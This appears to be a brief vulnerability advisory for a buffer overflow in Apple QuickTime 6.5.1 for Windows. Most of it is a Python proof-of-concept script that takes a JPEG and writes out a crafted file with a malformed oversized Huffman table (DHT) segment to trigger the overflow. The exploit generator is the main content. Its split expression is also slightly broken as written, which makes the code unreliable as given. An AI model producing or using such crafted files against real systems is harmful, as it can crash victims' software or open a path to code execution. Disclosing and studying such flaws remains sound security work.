Apple QuickTime is reportedly prone to a buffer overflow when viewing malformed image files.

This issue was reported to exist in QuickTime 6.5.1 for Windows. Other versions may also be affected.

import struct
f=open(raw_input("enter the path to the input file:\n"),"rb")
a=f.read()
f.close()
n=a.index("\xff\xc4")
b=a[:n]+"\xff\xc4\x02\x11\x00\xff\xff"+"\x00"*14+"\x01"*510
+a[n+2+struct.unpack("!H",a[n+2:n+4])[0]:]
f=open(raw_input("enter the path to the output file:\n"),"wb")
f.write(b)
f.close()
